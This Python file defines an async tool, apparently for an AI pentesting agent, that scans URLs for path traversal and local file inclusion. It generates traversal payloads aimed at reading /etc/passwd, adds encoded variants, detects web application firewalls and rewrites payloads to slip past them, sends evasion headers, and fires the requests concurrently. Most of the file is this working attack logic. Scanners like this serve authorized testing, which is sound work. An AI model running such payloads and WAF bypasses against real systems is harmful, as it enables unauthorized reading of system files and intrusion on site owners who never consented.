import re
import urllib.parse
from src.sdk.tool import function_tool
from .common import (
    _detect_waf,
    _get_evasion_headers,
    _waf_transform_payloads,
    async_fetch_all,
    register_appsec_vulnerability,
    PATH_TRAVERSAL_PAYLOADS,
)

# Session-level deduplication
_pt_scanned_urls: set[str] = set()

@function_tool()
async def path_traversal_scanner(url: str, parameter: str = "",
                           target_file: str = "/etc/passwd") -> str:
    """
    Scan for Path Traversal / Local File Inclusion vulnerabilities (Async Engine).

    AUTO-DISCOVERY: If no parameter is specified, the tool will first
    discover parameters via arjun_scan and HTTP response analysis before testing.

    Args:
        url: Target URL (with or without parameters)
        parameter: The parameter that handles file paths (leave empty for auto-discovery)
        target_file: File to try reading (default: /etc/passwd)

    Returns:
        Path traversal scan results
    """
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    results = [f"## Path Traversal Scanner (Async Engine): {parsed.netloc}\n"]

    discovered_params = []
    
    if not parameter:
        results.append("### Parameter Discovery Phase")

        # Method 1: Check URL query string
        if params:
            file_keywords = ['file', 'path', 'doc', 'page', 'dir', 'folder',
                            'include', 'load', 'src', 'read', 'template', 'view',
                            'download', 'attachment', 'image', 'img', 'url', 'dest']
            for kw in file_keywords:
                for p in params:
                    if kw in p.lower():
                        discovered_params.append(p)
            for p in params:
                if p not in discovered_params:
                    discovered_params.append(p)

        # Method 2: Try arjun_scan if no URL params found
        if not discovered_params:
            results.append("  No URL query parameters found — running arjun_scan...")
            try:
                from src.tools.web import arjun_scan
                arjun_result = await arjun_scan.invoke(url=url)
                arjun_params = re.findall(r'(?:Parameter|Param):\s*(\w+)', arjun_result)
                if arjun_params:
                    discovered_params = arjun_params
                    results.append(f"  ✅ arjun_scan found parameters: {', '.join(discovered_params)}")
            except Exception as e:
                results.append(f"  ⚠️ arjun_scan failed: {str(e)[:80]}")

        if not discovered_params:
            return "\n".join(results) + "\n⛔ No parameters discovered for testing. Please specify a parameter explicitly."
    else:
        if parameter not in params:
            # If specified but not in query, add it anyway (maybe the user knows it's there but the URL doesn't have it yet)
            params[parameter] = ""
        discovered_params = [parameter]
        
    results.append(f"Testing {len(discovered_params)} parameter(s): {', '.join(discovered_params)}\n")

    # Generate payloads
    payloads = []
    if target_file.startswith("/"):
        for depth in range(1, 10):
            payloads.append("../" * depth + target_file.lstrip("/"))
            payloads.append("..../" * depth + target_file.lstrip("/"))
        payloads.append(target_file)
    else:
        for depth in range(1, 10):
            payloads.append("..\\" * depth + target_file)

    # URL encoded versions
    encoded_payloads = []
    for p in payloads[:5]:
        encoded_payloads.append(urllib.parse.quote(p))
        encoded_payloads.append(p.replace("../", "%2e%2e%2f"))
        encoded_payloads.append(p.replace("../", "..%252f"))
    payloads.extend(encoded_payloads)

    # Pre-built traversal paths including alternative encodings and OS-specific variants
    payloads.extend(PATH_TRAVERSAL_PAYLOADS)

    # WAF bypass
    waf_vendor, waf_conf = _detect_waf(url)
    if waf_conf > 0.2:
        payloads = _waf_transform_payloads(payloads, "lfi", url=url, waf_vendor=waf_vendor)

    headers = _get_evasion_headers()
    
    # ── Formulation ──
    async_requests = []
    for param in discovered_params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_query = urllib.parse.urlencode(test_params, safe='')
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            async_requests.append({
                "method": "GET",
                "url": test_url,
                "headers": headers,
                "_param": param,
                "_payload": payload
            })
            
    # ── Execution ──
    results.append(f"🚀 Launching async swarm for {len(async_requests)} path traversal payloads...")
    scan_results = await async_fetch_all(async_requests, max_concurrent=20, timeout_sec=10)
    
    vulnerable = []
    success_indicators = [
        "root:", "daemon:", "nobody:",
        "[boot loader]", "[operating systems]",
        "<?xml", "<?php",
    ]
    
    for res in scan_results:
        if res["error"] or res["status"] != 200:
            continue
            
        text = res["text"].lower()
        req_meta = res["req"]
        
        for indicator in success_indicators:
            if indicator.lower() in text:
                vulnerable.append({
                    "parameter": req_meta["_param"],
                    "payload": req_meta["_payload"],
                    "evidence": f"Found indicator '{indicator}'"
                })
                break
                
    # Deduplicate
    unique_vulns = {}
    for v in vulnerable:
        if v["parameter"] not in unique_vulns:
            unique_vulns[v["parameter"]] = v
            
    final_vulns = list(unique_vulns.values())
    
    results.append("\n## Summary")
    if final_vulns:
        results.append(f"🔴 Found {len(final_vulns)} parameters vulnerable to Path Traversal!")
        
        for vuln in final_vulns:
            results.append(f"  - Parameter: {vuln['parameter']}")
            results.append(f"    Payload: {vuln['payload']}")
            results.append(f"    Evidence: {vuln['evidence']}")
            
            await register_appsec_vulnerability(
                target_url=url,
                vuln_type="Path Traversal / LFI",
                severity="HIGH",
                parameter=vuln['parameter'],
                payload=vuln['payload'],
                evidence=vuln['evidence']
            )
    else:
        results.append("✅ No path traversal detected.")

    return "\n".join(results)
